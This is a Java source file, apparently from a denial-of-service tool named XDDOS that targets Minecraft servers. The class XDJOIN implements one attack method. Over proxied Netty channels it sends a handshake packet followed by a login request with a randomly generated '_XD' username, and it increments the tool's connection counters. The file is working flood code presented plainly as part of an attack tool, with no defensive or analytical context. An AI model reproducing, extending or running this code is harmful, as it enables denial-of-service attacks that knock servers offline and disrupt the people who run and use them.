package XD.XDDOS.methods.impl;

import java.security.SecureRandom;

import XD.XDDOS.XDDOS;
import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.packet.Handshake;
import XD.XDDOS.utils.packet.LoginRequest;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;


public class XDJOIN
  implements IMethod
{
  private final Handshake handshake;
  private final byte[] bytes;


  public XDJOIN() {
    this.handshake = new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2);
    this.bytes = this.handshake.getWrappedPacket();
  }

  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(this.bytes));
    channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest((new SecureRandom()).nextInt(999999999)+"_XD")).getWrappedPacket()));
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
  }
}
